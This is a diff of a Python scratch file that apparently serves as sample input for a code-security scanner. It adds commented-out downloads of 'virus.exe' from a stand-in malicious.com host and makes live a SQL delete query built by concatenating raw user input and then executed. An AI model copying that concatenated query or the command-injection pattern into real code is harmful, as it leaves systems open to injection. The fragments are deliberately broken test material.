@@ -1,3 +1,16 @@
+# url = 'https://www.malicious.com/virus.exe'
+# requests.get(url)
+
+# url = 'https://www.malicious.com/files?file=virus.exe'
+# requests.get(url)
+
+# url = 'https://www.malicious.com/files?virus.exe'
+# requests.get(url)
+
+
+# url = 'http://localhost:8000'
+# requests.get(url)
+
 # import hashlib
 
 # try: result = 'abcedf'
@@ -48,20 +61,22 @@
 
 # urllib.urlretrieve("192.168.10.1/example.iso")
 
-# query = "delete from foo where id = " + user_input + user_input
+user_input = 'abcdef'
+user_input = input()
+query = "delete from foo where id = " + user_input + user_input
 # x = "abc"
 
-user_input = input()
-process = input()
-pre = 'kil - {}'.format(process)
+# process = input()
+# pre = 'kil - {}'.format(process)
 
+# process = 'abcdef'
 
-subprocess.Popen('kil - {}'.format(process))
+# subprocess.Popen('kil - {}'.format(process))
 # subprocess.Popen("A list: %s, %s" % process % pre)
 # subprocess.Popen('In the basket are %s and %s' % (comm,pre))
 
 
-# execution.query(user_input)
+execution.query(user_input)
 # result = connection.execute(user_input)
 # sys.argv(f'sudo mkdir {user_input}')
 
